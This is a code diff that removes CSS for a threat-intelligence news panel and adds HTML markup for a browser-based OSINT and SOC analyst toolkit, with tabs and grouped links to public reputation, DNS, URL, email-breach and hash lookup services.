-  font-size: 11px;
-  font-weight: 700;
-  padding: 6px 14px;
-  cursor: pointer;
-  transition: opacity 0.15s;
-  white-space: nowrap;
-}
-.cti-news-btn:hover { opacity: 0.85; }
-.cti-news-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-.cti-news-status {
-  padding: 8px 16px;
-  font-size: 11px;
-  color: var(--muted);
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  border-bottom: 1px solid var(--border);
-}
-.cti-news-spinner {
-  width: 14px; height: 14px;
-  border: 2px solid var(--border);
-  border-top-color: #38bdf8;
-  border-radius: 50%;
-  animation: spin 0.7s linear infinite;
-  flex-shrink: 0;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-.cti-news-results {
-  padding: 10px 12px;
-  display: flex;
-  flex-direction: column;
-  gap: 8px;
-  min-height: 120px;
-  max-height: 520px;
-  overflow-y: auto;
-}
-.cti-news-empty {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  padding: 40px 20px;
-  gap: 8px;
-  color: var(--muted);
-}
-.cti-news-empty-icon { font-size: 32px; opacity: 0.4; }
-.cti-news-empty-text { font-size: 13px; font-weight: 600; color: var(--text); }
-.cti-news-empty-sub  { font-size: 11px; }
-
-/* News item card */
-.cti-news-item {
-  background: var(--bg2);
-  border: 1px solid var(--border);
-  border-radius: 10px;
-  padding: 11px 14px;
-  transition: border-color 0.15s;
-}
-.cti-news-item:hover { border-color: rgba(56,189,248,0.35); }
-.cti-news-item-head {
-  display: flex;
-  align-items: flex-start;
-  gap: 10px;
-  margin-bottom: 6px;
-}
-.cti-news-item-badge {
-  font-size: 9px;
-  font-weight: 800;
-  padding: 2px 8px;
-  border-radius: 20px;
-  border: 1px solid;
-  white-space: nowrap;
-  flex-shrink: 0;
-  margin-top: 1px;
-  text-transform: uppercase;
-  letter-spacing: 0.4px;
-}
-.cti-news-item-title {
-  font-size: 12px;
-  font-weight: 700;
-  color: var(--text);
-  line-height: 1.4;
-  flex: 1;
-}
-.cti-news-item-body {
-  font-size: 11px;
-  color: var(--muted);
-  line-height: 1.6;
-  margin-bottom: 8px;
-}
-.cti-news-item-tags {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 4px;
-  margin-bottom: 8px;
-}
-.cti-news-item-tag {
-  font-size: 9px;
-  padding: 1px 7px;
-  border-radius: 20px;
-  background: rgba(56,189,248,0.08);
-  border: 1px solid rgba(56,189,248,0.20);
-  color: #38bdf8;
-}
-.cti-news-item-footer {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 8px;
-}
-.cti-news-item-meta {
-  font-size: 9px;
-  color: var(--muted);
-  opacity: 0.7;
-}
-.cti-news-item-links {
-  display: flex;
-  gap: 6px;
-}
-.cti-news-item-link {
-  font-size: 9px;
-  padding: 2px 8px;
-  border-radius: 6px;
-  background: rgba(255,255,255,0.05);
-  border: 1px solid var(--border);
-  color: var(--muted);
-  text-decoration: none;
-  transition: color 0.12s, border-color 0.12s;
-}
-.cti-news-item-link:hover { color: #38bdf8; border-color: rgba(56,189,248,0.4); }
-.cti-news-severity-critical { background: rgba(248,113,113,0.12); color: #f87171; border-color: rgba(248,113,113,0.35); }
-.cti-news-severity-high     { background: rgba(251,146,60,0.12);  color: #fb923c; border-color: rgba(251,146,60,0.35); }
-.cti-news-severity-medium   { background: rgba(251,191,36,0.12);  color: #fbbf24; border-color: rgba(251,191,36,0.35); }
-.cti-news-severity-info     { background: rgba(56,189,248,0.10);  color: #38bdf8; border-color: rgba(56,189,248,0.30); }
-
-.cti-news-footer {
-  padding: 8px 14px;
-  border-top: 1px solid var(--border);
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 12px;
-  flex-wrap: wrap;
-}
-.cti-news-footer-note { font-size: 9px; color: var(--muted); opacity: 0.7; }
-.cti-news-sources { display: flex; gap: 8px; flex-wrap: wrap; }
-.cti-news-src-link {
-  font-size: 9px;
-  color: var(--muted);
-  text-decoration: none;
-  padding: 1px 6px;
-  border-radius: 4px;
-  border: 1px solid var(--border);
-  transition: color 0.12s;
-}
-.cti-news-src-link:hover { color: #38bdf8; }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Centralized OSINT & SOC Toolkit — IOC investigation, log triage, threat intelligence, and incident response tools for cybersecurity analysts." />
+  <meta name="robots" content="noindex, nofollow" />
+  <!-- Prevent the browser from sending investigated IOCs as Referer headers to external tools -->
+  <meta name="referrer" content="no-referrer" />
+  <!-- Basic Content Security Policy — allows the tool to function while blocking unexpected scripts -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src *; img-src * data:; font-src *;" />
+  <title>OSINT &amp; SOC Toolkit</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <div class="sidebar">
+    <div class="brand">
+      <div class="logo">🔎</div>
+      <div>
+        <h2>OSINT</h2>
+        <p>SOC &amp; Threat Intel Toolkit</p>
+      </div>
+    </div>
+
+    <!-- Sensitivity reminder — always visible -->
+    <div style="margin:8px 10px 0;padding:6px 10px;background:rgba(251,146,60,0.08);border:1px solid rgba(251,146,60,0.25);border-radius:8px;font-size:9px;color:#fb923c;line-height:1.5;">
+      ⚠️ <strong>Sensitive data reminder:</strong> Do not paste credentials, PII, or classified IOCs. Tool runs locally — no data is sent to any server except direct tool lookups you initiate.
+    </div>
+
+    <div class="actions">
+      <button id="toggle-dark" type="button">🌙 Toggle Theme</button>
+      <button id="clear-all" type="button">🗑 Clear</button>
+      <button id="export-history" type="button">📤 Export History</button>
+    </div>
+
+    <!-- Session History -->
+    <div class="sidebar-section">
+      <div class="sidebar-section-head" style="display:flex;align-items:center;justify-content:space-between">
+        <span>🕓 IOC History <span style="font-size:10px;opacity:.6;font-weight:400">(persists across sessions)</span></span>
+        <button id="clear-history" type="button" style="font-size:10px;padding:2px 8px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--muted);cursor:pointer" title="Clear all history">✕ Clear</button>
+      </div>
+      <div id="history-list" class="history-list">
+        <div class="history-empty">No searches yet.</div>
+      </div>
+    </div>
+
+    <!-- Active Case Indicator -->
+    <div class="sidebar-section" id="case-indicator-section" style="display:none">
+      <div class="sidebar-section-head">📁 Active Case</div>
+      <div id="case-indicator" class="case-indicator"></div>
+    </div>
+
+    <div class="hint">
+      Landing page shows all tools.<br />
+      Search input shows only relevant OSINT.<br />
+      <strong>Shortcuts:</strong> Enter=Search · Ctrl+D=Defang · Ctrl+E=Extract · Ctrl+K=Focus · Ctrl+H=Hash File
+    </div>
+    <!-- Version footer in sidebar -->
+    <div style="margin-top:auto;padding:10px 12px 14px;border-top:1px solid var(--border);font-size:9px;color:var(--muted);line-height:1.7;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+        <span style="font-weight:700;color:var(--text)">OSINT SOC Toolkit</span>
+        <span id="toolkit-version-badge" style="background:rgba(56,189,248,0.1);color:#38bdf8;border:1px solid rgba(56,189,248,0.25);border-radius:20px;padding:1px 7px;font-weight:700;font-size:9px;">v2.0.0</span>
+      </div>
+      <div>📦 All processing is local. IOC history stored in this browser only.</div>
+      <div>🔗 Tool lookups open external sites — you initiate each one.</div>
+      <div>📡 RDAP domain age lookup requires your confirmation.</div>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="header">
+      <div>
+        <h1>OSINT &amp; SOC Toolkit</h1>
+        <div class="sub">IP / IPv6 / Domain / URL / Hash / CVE / Email pivots + Smart IOC Extractor + Log Triage + CTI</div>
+      </div>
+      <!-- Tab switcher -->
+      <div class="tab-bar">
+        <button class="tab-btn active" data-tab="single" type="button">🔍 Single IOC</button>
+        <button class="tab-btn" data-tab="bulk" type="button">📋 Bulk IOC</button>
+        <button class="tab-btn" data-tab="script" type="button">⚡ Script Analyzer</button>
+        <button class="tab-btn" data-tab="writeup" type="button">📝 Alert Write-up</button>
+        <button class="tab-btn" data-tab="case" type="button">📁 Case Manager</button>
+        <button class="tab-btn" data-tab="timeline" type="button">⏱ Timeline</button>
+        <button class="tab-btn" data-tab="hashfile" type="button">🔑 Hash File</button>
+        <button class="tab-btn" data-tab="defangbulk" type="button">🛡 Defang/Refang</button>
+        <button class="tab-btn" data-tab="yara" type="button">📜 YARA/Sigma</button>
+        <button class="tab-btn" data-tab="logtriage" type="button">🧾 Log Triage</button>
+        <button class="tab-btn" data-tab="threat" type="button">🕵 Threat Actor</button>
+        <button class="tab-btn" data-tab="custom" type="button">⚙ Custom Tools</button>
+        <button class="tab-btn" data-tab="utils" type="button">🛠 SOC Utils</button>
+        <button class="tab-btn" data-tab="cti" type="button">🌐 CTI Feed</button>
+      </div>
+    </div>
+
+    <!-- ===== SINGLE IOC TAB ===== -->
+    <div id="tab-single" class="tab-panel active">
+      <div class="input-panel">
+        <div class="input-row">
+          <div class="searchbox" id="searchbox">
+            <div class="search-ico">🔎</div>
+            <input id="input" type="text"
+              placeholder="Enter IP / IPv6 / Domain / URL / Email / Username / Hash / CVE / Event ID / Txxxx or paste Email Headers / logs"
+              autocomplete="off" spellcheck="false" />
+            <button id="clear-input" class="clear-input" type="button" aria-label="Clear">✕</button>
+          </div>
+          <button id="search-btn" type="button">Search</button>
+        </div>
+
+        <div class="tools">
+          <button id="defang-btn" type="button" title="Ctrl+D">Defang</button>
+          <button id="refang-btn" type="button">Refang</button>
+          <button id="extract-btn" type="button" title="Ctrl+E">Extract IOCs</button>
+          <button id="copy-btn" type="button">Copy</button>
+          <button id="add-to-case-btn" type="button" title="Add current IOC to active case">📁 Add to Case</button>
+        </div>
+
+        <div id="status" class="status">
+          <span>Status: ready (landing page)</span>
+          <span class="badge">OSINT</span>
+        </div>
+
+        <!-- Verdict Banner -->
+        <div id="verdict-banner" class="verdict-banner" style="display:none"></div>
+
+        <!-- Quick Threat Assessment Banner -->
+        <div id="threat-score-panel" class="threat-score-panel" style="display:none">
+          <div class="ts-banner" id="ts-banner-toggle">
+            <span class="ts-banner-label">⚡ Quick Assessment</span>
+            <span id="ts-overall-badge" class="ts-overall-badge">—</span>
+            <div class="ts-pill-row" id="ts-pill-row"></div>
+            <span class="ts-toggle" id="ts-toggle-arrow">▼</span>
+          </div>
+          <div id="ts-body" class="ts-body"></div>
+        </div>
+
+        <!-- CVE Enrichment Panel -->
+        <div id="cve-enrichment" class="cve-enrichment" style="display:none"></div>
+
+        <!-- Threat Actor Hint Panel (Feature 14) -->
+        <div id="actor-hint-panel" class="actor-hint-panel" style="display:none"></div>
+
+        <textarea id="output" placeholder="Results / Extracted IOCs (Tip: Paste full email headers/logs here then press Search or Extract IOCs)"></textarea>
+        <div class="hintline">Tip: Paste full email headers/logs into the Output box then press Search (or Extract IOCs).</div>
+      </div>
+
+      <!-- ===================== IP ===================== -->
+      <div class="tool-section" data-type="ip">
+        <div class="section-head"><h2>🛡 Threat & Reputation (IP)</h2><div class="pill">IP pivots</div></div>
+        <div class="tool-grid">
+          <a id="ip_vt" target="_blank"><div class="title">🧪 VirusTotal <span class="lock">🔒</span></div><div class="meta" data-meta="ip_vt"></div></a>
+          <a id="ip_abuseipdb" target="_blank"><div class="title">🚫 AbuseIPDB <span class="lock">🔒</span></div><div class="meta" data-meta="ip_abuseipdb"></div></a>
+          <a id="ip_talos" target="_blank"><div class="title">🕵️ Talos <span class="lock">🔒</span></div><div class="meta" data-meta="ip_talos"></div></a>
+          <a id="ip_ibmxf" target="_blank"><div class="title">🧠 IBM X-Force <span class="lock">🔒</span></div><div class="meta" data-meta="ip_ibmxf"></div></a>
+          <a id="ip_otx" target="_blank"><div class="title">👽 AlienVault OTX <span class="lock">🔒</span></div><div class="meta" data-meta="ip_otx"></div></a>
+          <a id="ip_anyrun" target="_blank"><div class="title">🏃 AnyRun (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_anyrun"></div></a>
+          <a id="ip_mxtoolbox" target="_blank"><div class="title">📧 MXToolBox (Blacklist) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_mxtoolbox"></div></a>
+          <a id="ip_blacklistchecker" target="_blank"><div class="title">🧱 Blacklist Checker <span class="lock">🔒</span></div><div class="meta" data-meta="ip_blacklistchecker"></div></a>
+          <a id="ip_cleantalk" target="_blank"><div class="title">🧼 CleanTalk (Blacklist) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_cleantalk"></div></a>
+          <a id="ip_shodan" target="_blank"><div class="title">🛰 Shodan <span class="lock">🔒</span></div><div class="meta" data-meta="ip_shodan"></div></a>
+          <a id="ip_censys" target="_blank"><div class="title">🔭 Censys <span class="lock">🔒</span></div><div class="meta" data-meta="ip_censys"></div></a>
+          <a id="ip_greynoise" target="_blank"><div class="title">🌫 GreyNoise <span class="lock">🔒</span></div><div class="meta" data-meta="ip_greynoise"></div></a>
+          <a id="ip_iplocation" target="_blank"><div class="title">📍 IPLocation <span class="lock">🔒</span></div><div class="meta" data-meta="ip_iplocation"></div></a>
+          <a id="ip_ipinfo" target="_blank"><div class="title">🗺 IPinfo <span class="lock">🔒</span></div><div class="meta" data-meta="ip_ipinfo"></div></a>
+          <a id="ip_whatismyipaddress" target="_blank"><div class="title">🧾 WhatIsMyIPAddress <span class="lock">🔒</span></div><div class="meta" data-meta="ip_whatismyipaddress"></div></a>
+          <a id="ip_myip" target="_blank"><div class="title">🧷 myip.ms <span class="lock">🔒</span></div><div class="meta" data-meta="ip_myip"></div></a>
+          <a id="ip_spur" target="_blank"><div class="title">🕳 SPUR (VPN detect) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_spur"></div></a>
+          <a id="ip_clickfix" target="_blank"><div class="title">🧲 ClickFix Hunter <span class="lock">🔒</span></div><div class="meta" data-meta="ip_clickfix"></div></a>
+          <a id="ip_ripestat" target="_blank"><div class="title">🗃 RIPEstat <span class="lock">🔒</span></div><div class="meta" data-meta="ip_ripestat"></div></a>
+          <a id="ip_bgphe" target="_blank"><div class="title">🌐 BGP.he.net (ASN) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_bgphe"></div></a>
+          <a id="ip_nitter" target="_blank"><div class="title">🐦 Nitter (Tweets) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_nitter"></div></a>
+          <a id="ip_threatminer" target="_blank"><div class="title">⛏ ThreatMiner <span class="lock">🔒</span></div><div class="meta" data-meta="ip_threatminer"></div></a>
+          <a id="ip_urlscan" target="_blank"><div class="title">🔎 urlscan.io <span class="lock">🔒</span></div><div class="meta" data-meta="ip_urlscan"></div></a>
+          <a id="ip_viewdns" target="_blank"><div class="title">🧩 ViewDNS IP History <span class="lock">🔒</span></div><div class="meta" data-meta="ip_viewdns"></div></a>
+          <a id="ip_scamalytics" target="_blank"><div class="title">🎭 Scamalytics <span class="lock">🔒</span></div><div class="meta" data-meta="ip_scamalytics"></div></a>
+          <a id="ip_threatfox" target="_blank"><div class="title">🦊 ThreatFox (C2) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_threatfox"></div></a>
+          <a id="ip_pulsedive" target="_blank"><div class="title">📡 Pulsedive <span class="lock">🔒</span></div><div class="meta" data-meta="ip_pulsedive"></div></a>
+          <a id="ip_securitytrails" target="_blank"><div class="title">🧭 SecurityTrails (rDNS) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_securitytrails"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== DOMAIN ===================== -->
+      <div class="tool-section" data-type="domain">
+        <div class="section-head"><h2>🌐 Domain & DNS</h2><div class="pill">Domain pivots</div></div>
+        <div class="tool-grid">
+          <a id="dom_vt" target="_blank"><div class="title">🧪 VirusTotal <span class="lock">🔒</span></div><div class="meta" data-meta="dom_vt"></div></a>
+          <a id="dom_talos" target="_blank"><div class="title">🕵️ Talos <span class="lock">🔒</span></div><div class="meta" data-meta="dom_talos"></div></a>
+          <a id="dom_ibmxf" target="_blank"><div class="title">🧠 IBM X-Force <span class="lock">🔒</span></div><div class="meta" data-meta="dom_ibmxf"></div></a>
+          <a id="dom_otx" target="_blank"><div class="title">👽 AlienVault OTX <span class="lock">🔒</span></div><div class="meta" data-meta="dom_otx"></div></a>
+          <a id="dom_urlscan" target="_blank"><div class="title">🔎 URLScan <span class="lock">🔒</span></div><div class="meta" data-meta="dom_urlscan"></div></a>
+          <a id="dom_mxtoolbox" target="_blank"><div class="title">📧 MXToolBox (Blacklist) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_mxtoolbox"></div></a>
+          <a id="dom_blacklistchecker" target="_blank"><div class="title">🧱 Blacklist Checker <span class="lock">🔒</span></div><div class="meta" data-meta="dom_blacklistchecker"></div></a>
+          <a id="dom_cleantalk_bl" target="_blank"><div class="title">🧼 CleanTalk (Blacklist) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_cleantalk_bl"></div></a>
+          <a id="dom_cleantalk_malware" target="_blank"><div class="title">🧼 CleanTalk (Malware Scan) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_cleantalk_malware"></div></a>
+          <a id="dom_sucuri" target="_blank"><div class="title">🛡 SUCURI (Malware Scan) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_sucuri"></div></a>
+          <a id="dom_urlvoid" target="_blank"><div class="title">🕸 URLVoid <span class="lock">🔒</span></div><div class="meta" data-meta="dom_urlvoid"></div></a>
+          <a id="dom_urlhaus" target="_blank"><div class="title">🏚 URLHaus <span class="lock">🔒</span></div><div class="meta" data-meta="dom_urlhaus"></div></a>
+          <a id="dom_whois" target="_blank"><div class="title">📇 WHOIS <span class="lock">🔒</span></div><div class="meta" data-meta="dom_whois"></div></a>
+          <a id="dom_dnslytics" target="_blank"><div class="title">🧬 DNSLytics <span class="lock">🔒</span></div><div class="meta" data-meta="dom_dnslytics"></div></a>
+          <a id="dom_netcraft" target="_blank"><div class="title">🏗 Netcraft <span class="lock">🔒</span></div><div class="meta" data-meta="dom_netcraft"></div></a>
+          <a id="dom_webcheck" target="_blank"><div class="title">🧪 Web Check <span class="lock">🔒</span></div><div class="meta" data-meta="dom_webcheck"></div></a>
+          <a id="dom_securitytrails" target="_blank"><div class="title">🧭 SecurityTrails <span class="lock">🔒</span></div><div class="meta" data-meta="dom_securitytrails"></div></a>
+          <a id="dom_hudsonrock_info" target="_blank"><div class="title">🧯 HudsonRock Infostealer <span class="lock">🔒</span></div><div class="meta" data-meta="dom_hudsonrock_info"></div></a>
+          <a id="dom_hudsonrock_urls" target="_blank"><div class="title">🧾 HudsonRock URL Discovery <span class="lock">🔒</span></div><div class="meta" data-meta="dom_hudsonrock_urls"></div></a>
+          <a id="dom_socradar" target="_blank"><div class="title">🕳 SOCRadar DarkWebReport <span class="lock">🔒</span></div><div class="meta" data-meta="dom_socradar"></div></a>
+          <a id="dom_wayback" target="_blank"><div class="title">🕰 Wayback Machine <span class="lock">🔒</span></div><div class="meta" data-meta="dom_wayback"></div></a>
+          <a id="dom_wayback_save" target="_blank"><div class="title">💾 Wayback (Save) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_wayback_save"></div></a>
+          <a id="dom_browserling" target="_blank"><div class="title">🧊 Browserling <span class="lock">🔒</span></div><div class="meta" data-meta="dom_browserling"></div></a>
+          <a id="dom_anyrun" target="_blank"><div class="title">🏃 AnyRun (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_anyrun"></div></a>
+          <a id="dom_anyrun_safe" target="_blank"><div class="title">🧯 AnyRun (Submit) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_anyrun_safe"></div></a>
+          <a id="dom_phishing_checker" target="_blank"><div class="title">🎣 Phishing Checker <span class="lock">🔒</span></div><div class="meta" data-meta="dom_phishing_checker"></div></a>
+          <a id="dom_clickfix" target="_blank"><div class="title">🧲 ClickFix Hunter <span class="lock">🔒</span></div><div class="meta" data-meta="dom_clickfix"></div></a>
+          <a id="dom_nitter" target="_blank"><div class="title">🐦 Nitter (Tweets) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_nitter"></div></a>
+          <a id="dom_netlas" target="_blank"><div class="title">🧿 Netlas <span class="lock">🔒</span></div><div class="meta" data-meta="dom_netlas"></div></a>
+          <a id="dom_censys" target="_blank"><div class="title">🔭 Censys <span class="lock">🔒</span></div><div class="meta" data-meta="dom_censys"></div></a>
+          <a id="dom_shodan" target="_blank"><div class="title">🛰 Shodan <span class="lock">🔒</span></div><div class="meta" data-meta="dom_shodan"></div></a>
+          <a id="dom_dnstools" target="_blank"><div class="title">📇 WHOIS DomainTools <span class="lock">🔒</span></div><div class="meta" data-meta="dom_dnstools"></div></a>
+          <a id="dom_crtsh" target="_blank"><div class="title">🔐 crt.sh (Cert Transparency) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_crtsh"></div></a>
+          <a id="dom_dnsdumpster" target="_blank"><div class="title">🗺 DNSDumpster <span class="lock">🔒</span></div><div class="meta" data-meta="dom_dnsdumpster"></div></a>
+          <a id="dom_threatfox" target="_blank"><div class="title">🦊 ThreatFox <span class="lock">🔒</span></div><div class="meta" data-meta="dom_threatfox"></div></a>
+          <a id="dom_pulsedive" target="_blank"><div class="title">📡 Pulsedive <span class="lock">🔒</span></div><div class="meta" data-meta="dom_pulsedive"></div></a>
+          <a id="dom_passivedns" target="_blank"><div class="title">🕰 Passive DNS History <span class="lock">🔒</span></div><div class="meta" data-meta="dom_passivedns"></div></a>
+          <a id="dom_rdap" target="_blank"><div class="title">📇 RDAP (Reg Age) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_rdap"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== URL ANALYSIS ===================== -->
+      <div class="tool-section" data-type="url">
+        <div class="section-head"><h2>🔗 URL Analysis</h2><div class="pill">URL / Link pivots</div></div>
+        <div class="tool-grid">
+          <a id="url_vt" target="_blank"><div class="title">🧪 VirusTotal URL <span class="lock">🔒</span></div><div class="meta" data-meta="url_vt"></div></a>
+          <a id="url_urlscan" target="_blank"><div class="title">🔎 URLScan.io <span class="lock">🔒</span></div><div class="meta" data-meta="url_urlscan"></div></a>
+          <a id="url_urlvoid" target="_blank"><div class="title">🕸 URLVoid <span class="lock">🔒</span></div><div class="meta" data-meta="url_urlvoid"></div></a>
+          <a id="url_urlhaus" target="_blank"><div class="title">🏚 URLHaus <span class="lock">🔒</span></div><div class="meta" data-meta="url_urlhaus"></div></a>
+          <a id="url_phishtank" target="_blank"><div class="title">🎣 PhishTank <span class="lock">🔒</span></div><div class="meta" data-meta="url_phishtank"></div></a>
+          <a id="url_checkphish" target="_blank"><div class="title">🐟 CheckPhish <span class="lock">🔒</span></div><div class="meta" data-meta="url_checkphish"></div></a>
+          <a id="url_safebrowsing" target="_blank"><div class="title">🛡 Google Safe Browsing <span class="lock">🔒</span></div><div class="meta" data-meta="url_safebrowsing"></div></a>
+          <a id="url_sucuri" target="_blank"><div class="title">🧹 Sucuri SiteCheck <span class="lock">🔒</span></div><div class="meta" data-meta="url_sucuri"></div></a>
+          <a id="url_browserling" target="_blank"><div class="title">🧊 Browserling (Preview) <span class="lock">🔒</span></div><div class="meta" data-meta="url_browserling"></div></a>
+          <a id="url_wayback" target="_blank"><div class="title">🕰 Wayback Machine <span class="lock">🔒</span></div><div class="meta" data-meta="url_wayback"></div></a>
+          <a id="url_anyrun" target="_blank"><div class="title">🏃 AnyRun (Submit) <span class="lock">🔒</span></div><div class="meta" data-meta="url_anyrun"></div></a>
+          <a id="url_otx" target="_blank"><div class="title">👽 AlienVault OTX <span class="lock">🔒</span></div><div class="meta" data-meta="url_otx"></div></a>
+          <a id="url_threatfox" target="_blank"><div class="title">🦊 ThreatFox <span class="lock">🔒</span></div><div class="meta" data-meta="url_threatfox"></div></a>
+          <a id="url_netcraft" target="_blank"><div class="title">🏗 Netcraft <span class="lock">🔒</span></div><div class="meta" data-meta="url_netcraft"></div></a>
+          <a id="url_webcheck" target="_blank"><div class="title">🧪 Web Check <span class="lock">🔒</span></div><div class="meta" data-meta="url_webcheck"></div></a>
+          <a id="url_securitytrails" target="_blank"><div class="title">🧭 SecurityTrails <span class="lock">🔒</span></div><div class="meta" data-meta="url_securitytrails"></div></a>
+          <a id="url_hudsonrock_info" target="_blank"><div class="title">🧯 HudsonRock Infostealer <span class="lock">🔒</span></div><div class="meta" data-meta="url_hudsonrock_info"></div></a>
+          <a id="url_hudsonrock_urls" target="_blank"><div class="title">🧾 HudsonRock URL Discovery <span class="lock">🔒</span></div><div class="meta" data-meta="url_hudsonrock_urls"></div></a>
+          <a id="url_socradar" target="_blank"><div class="title">🕳 SOCRadar DarkWebReport <span class="lock">🔒</span></div><div class="meta" data-meta="url_socradar"></div></a>
+          <a id="url_wayback_save" target="_blank"><div class="title">💾 Wayback (Save) <span class="lock">🔒</span></div><div class="meta" data-meta="url_wayback_save"></div></a>
+          <a id="url_phishing_checker" target="_blank"><div class="title">🎣 Phishing Checker <span class="lock">🔒</span></div><div class="meta" data-meta="url_phishing_checker"></div></a>
+          <a id="url_clickfix" target="_blank"><div class="title">🧲 ClickFix Hunter <span class="lock">🔒</span></div><div class="meta" data-meta="url_clickfix"></div></a>
+          <a id="url_cyberchef" target="_blank"><div class="title">🧪 CyberChef <span class="lock">🔒</span></div><div class="meta" data-meta="url_cyberchef"></div></a>
+          <a id="url_nitter" target="_blank"><div class="title">🐦 Nitter (Tweets) <span class="lock">🔒</span></div><div class="meta" data-meta="url_nitter"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== EMAIL & BREACH ===================== -->
+      <div class="tool-section" data-type="email">
+        <div class="section-head"><h2>📧 Email & Breach</h2><div class="pill">Email pivots</div></div>
+        <div class="tool-grid">
+          <a id="em_hunter" target="_blank"><div class="title">🧾 Hunter.io <span class="lock">🔒</span></div><div class="meta" data-meta="em_hunter"></div></a>
+          <a id="em_hibp" target="_blank"><div class="title">🧨 HaveIBeenPwned <span class="lock">🔒</span></div><div class="meta" data-meta="em_hibp"></div></a>
+          <a id="em_intelbase" target="_blank"><div class="title">🕵️ IntelBase <span class="lock">🔒</span></div><div class="meta" data-meta="em_intelbase"></div></a>
+          <a id="em_emailrep" target="_blank"><div class="title">📊 EmailRep.io <span class="lock">🔒</span></div><div class="meta" data-meta="em_emailrep"></div></a>
+          <a id="em_epieos" target="_blank"><div class="title">🔬 Epieos (OSINT) <span class="lock">🔒</span></div><div class="meta" data-meta="em_epieos"></div></a>
+          <a id="em_intelx" target="_blank"><div class="title">📡 IntelX <span class="lock">🔒</span></div><div class="meta" data-meta="em_intelx"></div></a>
+          <a id="em_phonebook" target="_blank"><div class="title">📒 Phonebook.cz <span class="lock">🔒</span></div><div class="meta" data-meta="em_phonebook"></div></a>
+          <a id="em_dehashed" target="_blank"><div class="title">🗝 Dehashed <span class="lock">🔒</span></div><div class="meta" data-meta="em_dehashed"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== EMAIL HEADERS ===================== -->
+      <div class="tool-section" data-type="header">
+        <div class="section-head"><h2>🧾 Email Header Analysis Toolkit</h2><div class="pill">Paste-based tools</div></div>
+        <div class="tool-grid">
+          <a id="hdr_mha" target="_blank"><div class="title">🧩 Microsoft Header Analyzer <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_mha"></div></a>
+          <a id="hdr_google" target="_blank"><div class="title">🧰 Google Messageheader <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_google"></div></a>
+          <a id="hdr_mxtoolbox" target="_blank"><div class="title">📧 MXToolbox Header Analyzer <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_mxtoolbox"></div></a>
+          <a id="hdr_traceemail" target="_blank"><div class="title">🧵 Trace Email <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_traceemail"></div></a>
+          <a id="hdr_dnschecker" target="_blank"><div class="title">🧪 DNSChecker Header Analyzer <span class="lock">🔒</span></div><div class="meta" data-meta="hdr_dnschecker"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== HASH ===================== -->
+      <div class="tool-section" data-type="hash">
+        <div class="section-head"><h2>🔒 Hash Lookup</h2><div class="pill">File pivots</div></div>
+        <div class="tool-grid">
+          <a id="h_vt" target="_blank"><div class="title">🧪 VirusTotal <span class="lock">🔒</span></div><div class="meta" data-meta="h_vt"></div></a>
+          <a id="h_hybrid" target="_blank"><div class="title">🧫 Hybrid-Analysis <span class="lock">🔒</span></div><div class="meta" data-meta="h_hybrid"></div></a>
+          <a id="h_joesandbox" target="_blank"><div class="title">🧪 JOE Sandbox <span class="lock">🔒</span></div><div class="meta" data-meta="h_joesandbox"></div></a>
+          <a id="h_triage" target="_blank"><div class="title">🧯 Triage <span class="lock">🔒</span></div><div class="meta" data-meta="h_triage"></div></a>
+          <a id="h_malshare" target="_blank"><div class="title">📦 MalShare <span class="lock">🔒</span></div><div class="meta" data-meta="h_malshare"></div></a>
+          <a id="h_malwarebazaar" target="_blank"><div class="title">🦠 MalwareBazaar <span class="lock">🔒</span></div><div class="meta" data-meta="h_malwarebazaar"></div></a>
+          <a id="h_ibmxf" target="_blank"><div class="title">🧠 IBM X-Force <span class="lock">🔒</span></div><div class="meta" data-meta="h_ibmxf"></div></a>
+          <a id="h_talos" target="_blank"><div class="title">🕵️ Talos <span class="lock">🔒</span></div><div class="meta" data-meta="h_talos"></div></a>
+          <a id="h_otx" target="_blank"><div class="title">👽 AlienVault OTX <span class="lock">🔒</span></div><div class="meta" data-meta="h_otx"></div></a>
+          <a id="h_anyrun" target="_blank"><div class="title">🏃 AnyRun (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="h_anyrun"></div></a>
+          <a id="h_threatminer" target="_blank"><div class="title">⛏ ThreatMiner <span class="lock">🔒</span></div><div class="meta" data-meta="h_threatminer"></div></a>
